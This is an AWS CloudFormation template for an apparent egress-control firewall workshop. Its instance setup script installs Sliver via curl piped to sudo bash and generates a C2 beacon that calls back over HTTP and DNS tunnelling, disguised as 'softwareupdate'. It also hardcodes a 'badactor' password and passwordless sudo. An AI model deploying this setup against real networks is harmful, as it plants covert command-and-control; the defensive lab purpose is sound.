#Copyright 2021 Amazon.com, Inc. or its affiliates. All Rights Reserved.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

#Copyright 2021 Amazon.com, Inc. or its affiliates. All Rights Reserved.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

AWSTemplateFormatVersion: "2010-09-09"
Description: "Egress Controls workshop template"

Metadata:
  "AWS::CloudFormation::Interface":
    ParameterGroups:
      - Label:
          default: "VPC Parameters"
      - Label:
          default: "EC2 Parameters"
        Parameters:
          - LatestAmiId
      - Label: 
          default: "Logging Configuration"
        Parameters: 
          - FirewallAlertLogGroupName
          - FirewallFlowLogGroupName
      - Label: 
          default: "Contributor Insights Configuration"
        Parameters: 
          - ContributorInsightsRuleState

Parameters:
  LatestAmiId:
    Description: Latest EC2 AMI from Systems Manager Parameter Store
    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
    Default: '/aws/service/ami-amazon-linux-latest/amzn2-ami-kernel-5.10-hvm-x86_64-gp2'
  FirewallName:
      Description: Enter the firewall name as seen in the firewall console
      Type: String
      Default: "EgressWorkshop-InspectionFirewall"
  FirewallFlowLogGroupName:
      Type: String
      Description:  Name of the CloudWatch log group where your firewall flow logs are stored
      Default: "/EgressWorkshop/Anfw/Flow"
  FirewallAlertLogGroupName:
      Type: String
      Description:  Name of the CloudWatch log group where your firewall alert logs are stored
      Default: "/EgressWorkshop/Anfw/Alert"
  ContributorInsightsRuleState:
      Type: String
      Description: Choose to enable or disable the Contributor Insight rules created by this template
      Default: ENABLED
      AllowedValues:
        - ENABLED
        - DISABLED

Resources:
#Egress infrastructure
  EgressVPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.1.0.0/16"
      EnableDnsHostnames: true
      EnableDnsSupport: true
      Tags:
        - Key: Name
          Value: EgressVPC

  EgressInternetGateway:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
      - Key: Name
        Value: EgressVPC-IGW

  EgressGatewayAttachment:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      InternetGatewayId:
        !Ref EgressInternetGateway
      VpcId: !Ref EgressVPC

# Public Subnets for NAT GWs:
  PublicSubnet1:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.0.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: EgressVPC-Public-Subnet1


# Private Subnets for Test Instances:
  PrivateSubnet1:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.1.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet1


# Private Subnet for Test traffic:
  PrivateSubnet2:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.2.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet2
# Private Subnet for Test traffic:
  PrivateSubnet3:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.3.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet3
# Private Subnet for Test traffic:
  PrivateSubnet4:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.4.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet4  
# Private Subnet for Test traffic:
  PrivateSubnet5:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.5.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet5
# Private Subnet for VPC endpoints traffic:
  PrivateSubnet6:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.6.0/24"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Private-Subnet6 

# Firewall Subnets for firewall endpoints:
  FirewallSubnet1:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "10.1.16.0/28"
      AvailabilityZone:
        Fn::Select: 
          - 0
          - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: EgressVPC-Firewall-Subnet1

# NAT Gateway:
  NatGw1Eip:
    Type: AWS::EC2::EIP
    Properties:
      Domain: vpc

  EgressNetworkInterface:
    Type: AWS::EC2::NetworkInterface
    Properties:
      SubnetId: !Ref PublicSubnet1
      GroupSet:
        - !Ref EgressSecurityGroup
        - !Ref IngressDNSTrafficSecurityGroup


  EgressIP:
    DependsOn:
      - EgressGatewayAttachment
    Type: AWS::EC2::EIP
    Properties:
      Domain: vpc

  EgressIPAssociation:
    Type: AWS::EC2::EIPAssociation
    Properties:
      AllocationId: !GetAtt EgressIP.AllocationId
      NetworkInterfaceId: !Ref EgressNetworkInterface

  NatGw1:
    Type: AWS::EC2::NatGateway
    Properties:
      AllocationId: !GetAtt
        - NatGw1Eip
        - AllocationId
      SubnetId: !Ref PublicSubnet1
      Tags:
        - Key: Name
          Value: EgressVPC-NATGW

 
  EgressInstanceRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub EgressVPC-EgressInstanceRole-${AWS::Region}
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          -
            Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      ManagedPolicyArns:
      - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
      - arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess
      Policies:
        -
          PolicyName: EgressInstancePolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              -
                Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:DescribeParameters
                Resource:
                  Fn::Join:
                  - ':'
                  - ["arn:aws:ssm", !Ref "AWS::Region", !Ref "AWS::AccountId", "*"]

              - 
                Effect: "Allow"
                Action:
                  - "logs:CreateLogGroup"
                  - "logs:CreateLogStream"
                  - "logs:PutLogEvents"
                  - "logs:DescribeLogStreams"
                Resource: "arn:aws:logs:*:*:*"

  EgressInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      InstanceProfileName: EgressInstanceProfile
      Path: /
      Roles:
        - !Ref EgressInstanceRole
  
  EgressSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: EgressSecurityGroup
      VpcId: !Ref EgressVPC
      SecurityGroupIngress:
      - IpProtocol: '-1'
        CidrIp: !Sub "${NatGw1Eip.PublicIp}/32"
        #CidrIp: !GetAtt NatGw1Eip.PublicIp
  
  IngressDNSTrafficSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Allow DNS access on TCP and UDP for DNS ingress
      VpcId: !Ref EgressVPC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 53
          ToPort: 53
          CidrIp: "10.1.0.0/16"  # Private CIDR of EgressVPC
        - IpProtocol: udp
          FromPort: 53
          ToPort: 53
          CidrIp: "10.1.0.0/16"
      Tags:
        - Key: Name
          Value: IngressDNSTrafficSecurityGroup

  Route53OutboundResolverEndpoint:
    Type: AWS::Route53Resolver::ResolverEndpoint
    Properties:
      Direction: OUTBOUND
      Name: EgressVPC-Route53-Outbound-Resolver
      SecurityGroupIds:
        - !Ref IngressDNSTrafficSecurityGroup
      IpAddresses:
        - SubnetId: !Ref PrivateSubnet6
          Ip: 10.1.6.10  # Choose an available IP in PrivateSubnet1
        - SubnetId: !Ref PrivateSubnet6
          Ip: 10.1.6.11  # Choose another available IP in PrivateSubnet1
      Tags:
        - Key: Name
          Value: Route53OutboundResolverEndpoint

  Route53ResolverRule:
    Type: AWS::Route53Resolver::ResolverRule
    Properties:
      DomainName: "dnstunnel.com"
      Name: EgressVPC-DNSTunnel-Rule
      RuleType: FORWARD
      ResolverEndpointId: !Ref Route53OutboundResolverEndpoint
      TargetIps:
        - Ip: !GetAtt EgressInstance.PrivateIpAddress
          Port: 53
      Tags:
        - Key: Name
          Value: Route53ResolverRule

  # Associate the Resolver Rule with EgressVPC
  Route53ResolverRuleAssociation:
    Type: AWS::Route53Resolver::ResolverRuleAssociation
    Properties:
      Name: EgressVPC-DNSTunnel-Rule-Association
      ResolverRuleId: !Ref Route53ResolverRule
      VPCId: !Ref EgressVPC

  Route53ResolverQueryConfig:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfig
    Properties: 
      DestinationArn: !GetAtt EgressDNSQueryLogs.Arn
      Name: egress-query-logging

  EgressDNSQueryLogs: 
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: egress-query-logging
      RetentionInDays: 7

  Route53ResolverQueryConfigAssociation:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfigAssociation
    Properties:
      ResolverQueryLogConfigId: !GetAtt Route53ResolverQueryConfig.Id
      ResourceId: !Ref EgressVPC
      
  EgressInstance:
    Type: AWS::EC2::Instance
    CreationPolicy:
      ResourceSignal:
        Timeout: PT20M
    DependsOn:
     - EgressNetworkInterface
    Properties:
      IamInstanceProfile: !Ref EgressInstanceProfile
      InstanceType: t3.small
      ImageId: !Ref LatestAmiId
      NetworkInterfaces:
        - NetworkInterfaceId: !Ref EgressNetworkInterface
          DeviceIndex: '0'
      Tags:
        - Key: Name
          Value: PublicTrafficHost
      UserData:
        Fn::Base64: !Sub |
            #!/bin/bash -ex
            date > /tmp/image.log
            yum update -y
            # yum install -y https://s3.${AWS::Region}.amazonaws.com/amazon-ssm-${AWS::Region}/latest/linux_amd64/amazon-ssm-agent.rpm
            # systemctl start amazon-ssm-agent
            # /usr/bin/amazon-ssm-agent
            if ! id -u ssm-user >/dev/null 2>&1; then
               useradd -m -d /home/ssm-user -s /bin/bash ssm-user
            fi
            if [ ! -d /home/ssm-user ]; then
               mkdir -p /home/ssm-user
               chown ssm-user:ssm-user /home/ssm-user
               chmod 700 /home/ssm-user
            fi
            echo 'ssm-user ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/ssm-user
            # Install and configure FTP server
            yum install -y vsftpd
            cat << 'EOF' > /etc/vsftpd/vsftpd.conf
            ftp_data_port=21
            listen_port=21
            anonymous_enable=NO
            pasv_enable=YES
            pasv_min_port=64000
            pasv_max_port=64001
            port_enable=YES
            pasv_addr_resolve=YES
            write_enable=YES
            connect_from_port_20=YES
            ascii_upload_enable=YES
            local_enable=YES
            chroot_local_user=YES
            allow_writeable_chroot=YES
            userlist_enable=YES
            userlist_file=/etc/vsftpd/user_list
            userlist_deny=NO
            pam_service_name=vsftpd
            EOF

            # Configure FTP
            adduser badactor
            echo 5VXcbio8D3nsly | passwd --stdin badactor
            echo badactor | sudo tee –a /etc/vsftpd/user_list
            mkdir -p /home/badactor/ftp/upload
            chmod 550 /home/badactor/ftp
            chmod 750 /home/badactor/ftp/upload
            chown -R badactor: /home/badactor/ftp

            # Add the public IP to vsftpd config
            { echo -n "pasv_address="; curl -sS "http://checkip.amazonaws.com"; } >> /etc/vsftpd/vsftpd.conf

            # Start the ftp service and set it to launch when the system boots with the following
            systemctl start vsftpd
            systemctl enable vsftpd
            systemctl status vsftpd > /tmp/vsfptd.status


            # Install and start Apache httpd with mod_ssl (for SNI Spoofing test)
            yum install -y httpd mod_ssl
            sed -i '/Listen 80/a Listen 8080' /etc/httpd/conf/httpd.conf
            sed -i '/Listen 8080/a Listen 1389' /etc/httpd/conf/httpd.conf
            sed -i '/Listen 1389/a Listen 443' /etc/httpd/conf/httpd.conf 

            mkdir -p /etc/httpd/ssl
              openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
              -keyout /etc/httpd/ssl/apache-selfsigned.key \
              -out /etc/httpd/ssl/apache-selfsigned.crt \
              -subj "/C=US/ST=State/L=City/O=Organization/OU=Department/CN=checkip.amazonaws.com"  

            # Listen on 8443 instead off 443 since it's being used for other pre-existing Suricata rules tests
            sed -i 's/^Listen 443/Listen 8443/' /etc/httpd/conf.d/ssl.conf

            # Add the VirtualHost entry for SSL (port 8443) with SNI for checkip.amazonaws.com
            cat <<EOL >> /etc/httpd/conf.d/ssl.conf

            <VirtualHost *:8443>
              ServerName checkip.amazonaws.com
              ServerAdmin webmaster@localhost
              DocumentRoot /var/www/html
              SSLEngine on
              SSLCertificateFile /etc/httpd/ssl/apache-selfsigned.crt
              SSLCertificateKeyFile /etc/httpd/ssl/apache-selfsigned.key
              <Directory "/var/www/html">
                AllowOverride All
              </Directory>
              ErrorLog logs/ssl_error_log
              CustomLog logs/ssl_access_log common
            </VirtualHost>
            EOL

            systemctl start httpd
            systemctl enable httpd

            # Update sshd to Listen on port 2222
            sed -i '/^#ListenAddress ::/a Port 22\nPort 2222' /etc/ssh/sshd_config
            systemctl restart sshd


            # Install, Configure Samba
            yum install samba samba-client samba-common -y
            cat << 'EOF' > /etc/samba/smb.conf
            [share_name]
            path = /home/badactor/ftp/upload
            writable = yes
            browsable = yes
            valid users = badactor
            EOF
            # Start Samba services
            systemctl start smb
            systemctl start nmb

            # Generate Sliver implant
            cd /tmp

            # Create directory to store c2_implant
            mkdir /tmp/c2_implant

            # Install sliver
            curl https://sliver.sh/install|sudo bash

            # Ensure it will always run on startup 
            sudo systemctl enable sliver
          
            # Install expect for use with sliver implant and listener config
            yum install expect -y


            # C2_IP variable for script below
            C2_IP=${EgressIP}

            # Generate Sliver implant and set up listener
            cat << EOF > /tmp/sliver_expect_script.exp
            #!/usr/bin/expect -f

            set timeout 300
            spawn /usr/local/bin/sliver

            expect {
              -re {sliver[\x1b\[0m]* >} { send "generate beacon --http $C2_IP:4444 --dns 1.dnstunnel.com. --os linux --arch amd64 --format exe --seconds 5 --reconnect 5 --jitter 0 --save /tmp/c2_implant/softwareupdate\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >}
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "http -l 4444\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "dns -D -d 1.dnstunnel.com\r" }
            }

            expect {
              -re {sliver[\x1b\[0m]* >} { send "exit\r" }
            }

            expect eof
            EOF

            chmod +x /tmp/sliver_expect_script.exp
            /tmp/sliver_expect_script.exp

            # Compress the implant folder
            # tar -czf /tmp/c2_implant.tar.gz -C /tmp c2_implant

            # Copy to Apache document root
            cp /tmp/c2_implant/softwareupdate /var/www/html/softwareupdate
            chown apache:apache /var/www/html/softwareupdate
            chmod 644 /var/www/html/softwareupdate

            
            # Signal success
            /usr/bin/aws configure set region ${AWS::Region}
            /opt/aws/bin/cfn-signal -e $? --stack ${AWS::StackName} --resource EgressInstance --region ${AWS::Region}

# AWS PrivateLink interface endpoint for services:
  EgressVPCEndpointSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
        GroupDescription: Allow instances to get to SSM Systems Manager
        VpcId: !Ref EgressVPC
        SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 10.0.0.0/8
        Tags:
          - Key: Name
            Value: EgressVPC-VpcEnpoint-Sg1

  EgressVPCSSMEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties:
        PrivateDnsEnabled: true
        SecurityGroupIds:
          - !Ref EgressVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
        SubnetIds:
          - !Ref PrivateSubnet6
        VpcEndpointType: Interface
        VpcId: !Ref EgressVPC

  EgressVPCEC2MessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties:
        PrivateDnsEnabled: true
        SecurityGroupIds:
          - !Ref EgressVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
        SubnetIds:
          - !Ref PrivateSubnet6
        VpcEndpointType: Interface
        VpcId: !Ref EgressVPC

  EgressVPCSSMMessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties:
        PrivateDnsEnabled: true
        SecurityGroupIds:
          - !Ref EgressVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
        SubnetIds:
          - !Ref PrivateSubnet6
        VpcEndpointType: Interface
        VpcId: !Ref EgressVPC

# SSM Role:
  EC2InstanceRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "EgressVPC-SSMRole-${AWS::Region}"
      Path: "/"
      ManagedPolicyArns:
        - "arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM"
        - "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
                - "ssm.amazonaws.com"
            Action:
              - sts:AssumeRole
      Policies:
        - PolicyName: inline-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: "Allow"
                Action:
                  - "logs:CreateLogGroup"
                  - "logs:CreateLogStream"
                  - "logs:PutLogEvents"
                  - "logs:DescribeLogStreams"
                Resource: "arn:aws:logs:*:*:*"
              - Effect: "Allow"
                Action:
                  - "acm:*"
                Resource: "arn:aws:acm:*"
        - PolicyName: LambdaInvokePolicy
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - lambda:InvokeFunction
                  - lambda:InvokeAsync
                Resource:
                  - !GetAtt WebRequestLambda1.Arn        
                  - !GetAtt WebRequestLambda2.Arn
                  - !GetAtt WebRequestLambda3.Arn
                  - !GetAtt WebRequestLambda4.Arn
                  - !GetAtt WebRequestLambda5.Arn              
  EC2InstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref EC2InstanceRole

# Fn::GetAtt for Firewall do not return VPCE Id in ordered format.
# For more details refer to: https://github.com/aws-cloudformation/aws-cloudformation-resource-providers-networkfirewall/issues/15
# Until the bug is fixed we have to rely on custom resource to retrieve AZ specific VPCE Id.

# Lambda Role:
  LambdaExecutionRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "Egress-AnfwLambdaRole-${AWS::Region}"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: root
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: !GetAtt RetrieveVpcIdLogGroup.Arn
              - Effect: Allow
                Action:
                  - network-firewall:DescribeFirewall
                Resource: "*"
              
#Lambda Role and Function for sending test web traffic for allow list for auto domain list feature
  WebRequestLambdaRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub '${AWS::StackName}-web-request-lambda-role'
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole
      Policies:
        - PolicyName: LambdaWebRequestPolicy
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogGroup
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: arn:aws:logs:*:*:*
# Lambda for generating test web traffic for to be logged by auto domain list feature
  WebRequestLambda1:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub '${AWS::StackName}-web-request-lambda-1'
      Handler: index.handler
      Role: !GetAtt WebRequestLambdaRole.Arn
      Code:
        ZipFile: |
          import json
          import random
          import time
          import urllib.request
          import concurrent.futures

          WEBSITES = [
              'https://aws.amazon.com',
              'https://github.com/aws-samples/aws-network-firewall-automation-examples',
              'https://mirrors.fedoraproject.org',
              'https://github.com',
              'https://stackoverflow.com',
              'https://ecs.us-west-2.amazonaws.com/',
              'https://amazon.com',
              'https://iam.amazonaws.com',
              'https://docker.com',
              'https://pypi.org',
              'https://npmjs.com',
              'https://fleet.linuxserver.io/',
              'https://salesforce.com',
              'https://redshift.us-west-2.amazonaws.com',
              'https://sts.us-west-2.amazonaws.com',
              'https://slack.com',
              'https://www.partnerapi.com/',
              'https://atlassian.com',
              'https://redhat.com',
              'https://sns.us-west-2.amazonaws.com',
              'https://sqs.us-west-2.amazonaws.com',
              'https://dynamodb.us-west-2.amazonaws.com',
              'https://d2lzkl7pfhq30w.cloudfront.net',
              'https://pypi.python.org',
              'https://splunk.com'
          ]

          def fetch_url(url):
              try:
                  with urllib.request.urlopen(url, timeout=3) as response:
                      return {'url': url, 'status': response.getcode(), 'success': True}
              except Exception as e:
                  return {'url': url, 'status': str(e), 'success': False}

          def check_sites():
              # Randomize the order of websites
              sites = WEBSITES.copy()
              random.shuffle(sites)
              with concurrent.futures.ThreadPoolExecutor() as executor:
                  results = list(executor.map(fetch_url, sites))
              return results

          def handler(event, context):
              results = check_sites()
              successful_requests = sum(1 for r in results if r['success'])
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'timestamp': int(time.time()),
                      'total_sites': len(WEBSITES),
                      'successful_requests': successful_requests,
                      'results': results
                  })
              }
      Runtime: python3.12
      Timeout: 30
      MemorySize: 128
      VpcConfig:
        SecurityGroupIds:
          - !Ref SubnetSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet1
# additional lambdas to generate traffic from separate IP addresses           
  WebRequestLambda2:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub '${AWS::StackName}-web-request-lambda-2'
      Handler: index.handler
      Role: !GetAtt WebRequestLambdaRole.Arn
      Code:
        ZipFile: |
          import json
          import random
          import time
          import urllib.request
          import concurrent.futures

          WEBSITES = [
              'https://aws.amazon.com',
              'https://github.com/aws-samples/aws-network-firewall-automation-examples',
              'https://mirrors.fedoraproject.org',
              'https://github.com',
              'https://stackoverflow.com',
              'https://ecs.us-west-2.amazonaws.com/',
              'https://amazon.com',
              'https://iam.amazonaws.com',
              'https://docker.com',
              'https://pypi.org',
              'https://npmjs.com',
              'https://fleet.linuxserver.io/',
              'https://salesforce.com',
              'https://redshift.us-west-2.amazonaws.com',
              'https://sts.us-west-2.amazonaws.com',
              'https://slack.com',
              'https://www.partnerapi.com/',
              'https://atlassian.com',
              'https://redhat.com',
              'https://sns.us-west-2.amazonaws.com',
              'https://sqs.us-west-2.amazonaws.com',
              'https://dynamodb.us-west-2.amazonaws.com',
              'https://d2lzkl7pfhq30w.cloudfront.net',
              'https://pypi.python.org',
              'https://splunk.com'
          ]

          def fetch_url(url):
              try:
                  with urllib.request.urlopen(url, timeout=3) as response:
                      return {'url': url, 'status': response.getcode(), 'success': True}
              except Exception as e:
                  return {'url': url, 'status': str(e), 'success': False}

          def check_sites():
              # Randomize the order of websites
              sites = WEBSITES.copy()
              random.shuffle(sites)
              with concurrent.futures.ThreadPoolExecutor() as executor:
                  results = list(executor.map(fetch_url, sites))
              return results

          def handler(event, context):
              results = check_sites()
              successful_requests = sum(1 for r in results if r['success'])
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'timestamp': int(time.time()),
                      'total_sites': len(WEBSITES),
                      'successful_requests': successful_requests,
                      'results': results
                  })
              }
      Runtime: python3.12
      Timeout: 30
      MemorySize: 128
      VpcConfig:
        SecurityGroupIds:
          - !Ref SubnetSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet2

  WebRequestLambda3:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub '${AWS::StackName}-web-request-lambda-3'
      Handler: index.handler
      Role: !GetAtt WebRequestLambdaRole.Arn
      Code:
        ZipFile: |
          import json
          import random
          import time
          import urllib.request
          import concurrent.futures

          WEBSITES = [
              'https://aws.amazon.com',
              'https://github.com/aws-samples/aws-network-firewall-automation-examples',
              'https://mirrors.fedoraproject.org',
              'https://github.com',
              'https://stackoverflow.com',
              'https://ecs.us-west-2.amazonaws.com/',
              'https://amazon.com',
              'https://iam.amazonaws.com',
              'https://docker.com',
              'https://pypi.org',
              'https://npmjs.com',
              'https://fleet.linuxserver.io/',
              'https://salesforce.com',
              'https://redshift.us-west-2.amazonaws.com',
              'https://sts.us-west-2.amazonaws.com',
              'https://slack.com',
              'https://www.partnerapi.com/',
              'https://atlassian.com',
              'https://redhat.com',
              'https://sns.us-west-2.amazonaws.com',
              'https://sqs.us-west-2.amazonaws.com',
              'https://dynamodb.us-west-2.amazonaws.com',
              'https://d2lzkl7pfhq30w.cloudfront.net',
              'https://pypi.python.org',
              'https://splunk.com'
          ]

          def fetch_url(url):
              try:
                  with urllib.request.urlopen(url, timeout=3) as response:
                      return {'url': url, 'status': response.getcode(), 'success': True}
              except Exception as e:
                  return {'url': url, 'status': str(e), 'success': False}

          def check_sites():
              # Randomize the order of websites
              sites = WEBSITES.copy()
              random.shuffle(sites)
              with concurrent.futures.ThreadPoolExecutor() as executor:
                  results = list(executor.map(fetch_url, sites))
              return results

          def handler(event, context):
              results = check_sites()
              successful_requests = sum(1 for r in results if r['success'])
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'timestamp': int(time.time()),
                      'total_sites': len(WEBSITES),
                      'successful_requests': successful_requests,
                      'results': results
                  })
              }
      Runtime: python3.12
      Timeout: 30
      MemorySize: 128
      VpcConfig:
        SecurityGroupIds:
          - !Ref SubnetSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet3

  WebRequestLambda4:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub '${AWS::StackName}-web-request-lambda-4'
      Handler: index.handler
      Role: !GetAtt WebRequestLambdaRole.Arn
      Code:
        ZipFile: |
          import json
          import random
          import time
          import urllib.request
          import concurrent.futures

          WEBSITES = [
              'https://aws.amazon.com',
              'https://github.com/aws-samples/aws-network-firewall-automation-examples',
              'https://mirrors.fedoraproject.org',
              'https://github.com',
              'https://stackoverflow.com',
              'https://ecs.us-west-2.amazonaws.com/',
              'https://amazon.com',
              'https://iam.amazonaws.com',
              'https://docker.com',
              'https://pypi.org',
              'https://npmjs.com',
              'https://fleet.linuxserver.io/',
              'https://salesforce.com',
              'https://redshift.us-west-2.amazonaws.com',
              'https://sts.us-west-2.amazonaws.com',
              'https://slack.com',
              'https://www.partnerapi.com/',
              'https://atlassian.com',
              'https://redhat.com',
              'https://sns.us-west-2.amazonaws.com',
              'https://sqs.us-west-2.amazonaws.com',
              'https://dynamodb.us-west-2.amazonaws.com',
              'https://d2lzkl7pfhq30w.cloudfront.net',
              'https://pypi.python.org',
              'https://splunk.com'
          ]

          def fetch_url(url):
              try:
                  with urllib.request.urlopen(url, timeout=3) as response:
                      return {'url': url, 'status': response.getcode(), 'success': True}
              except Exception as e:
                  return {'url': url, 'status': str(e), 'success': False}

          def check_sites():
              # Randomize the order of websites
              sites = WEBSITES.copy()
              random.shuffle(sites)
              with concurrent.futures.ThreadPoolExecutor() as executor:
                  results = list(executor.map(fetch_url, sites))
              return results

          def handler(event, context):
              results = check_sites()
              successful_requests = sum(1 for r in results if r['success'])
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'timestamp': int(time.time()),
                      'total_sites': len(WEBSITES),
                      'successful_requests': successful_requests,
                      'results': results
                  })
              }
      Runtime: python3.12
      Timeout: 30
      MemorySize: 128
      VpcConfig:
        SecurityGroupIds:
          - !Ref SubnetSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet4

  WebRequestLambda5:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub '${AWS::StackName}-web-request-lambda-5'
      Handler: index.handler
      Role: !GetAtt WebRequestLambdaRole.Arn
      Code:
        ZipFile: |
          import json
          import random
          import time
          import urllib.request
          import concurrent.futures

          WEBSITES = [
              'https://aws.amazon.com',
              'https://github.com/aws-samples/aws-network-firewall-automation-examples',
